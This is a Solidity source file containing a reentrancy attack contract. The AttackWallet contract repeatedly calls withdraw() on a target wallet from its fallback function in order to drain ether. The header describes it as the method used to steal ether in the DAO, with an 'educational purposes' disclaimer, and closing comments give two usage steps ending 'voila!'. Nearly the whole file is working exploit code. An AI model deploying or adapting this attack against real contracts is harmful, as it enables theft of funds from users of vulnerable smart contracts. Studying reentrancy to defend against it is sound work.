pragma solidity ^0.4.8;

/*
/////////////////////////////// Method used to steal ether in the DAO and others //////////////////////////////////////
/////////////////////////////// This is only used for Educational purposes ///////////////////////////////////
/////////////////////////////// any misuse of this code is the responsibility ///////////////////////////////////
/////////////////////////////// of the user, and not the creator  ///////////////////////////////////
*/
contract UnsafeWallet {
    function withdraw() returns(bool);
    function deposit() payable returns(bool);
}

contract AttackWallet {
    UnsafeWallet wallet;
    function AttackWallet(address _unsafeWalletAddress) {
        wallet = UnsafeWallet(_unsafeWalletAddress);
    }

    function emptyWallet() {
        // msg.sender will be the contract itself
        wallet.withdraw.gas(msg.gas)();
            
    }

    function depositInUnsafeWallet() payable {
        wallet.deposit.gas(200000).value(msg.value)();
    }

    function depositInUnsafeWallet2() payable returns(bool){
        return wallet.call.gas(200000).value(msg.value)(bytes4(sha3("deposit()")));
    }

    function() payable {
        if(msg.gas > 1000000) {
            wallet.withdraw.gas(msg.gas)();

        }
    }
}

// Step 1, fund the account with a few wei
// Step 2, call emptyWallet(), and voila!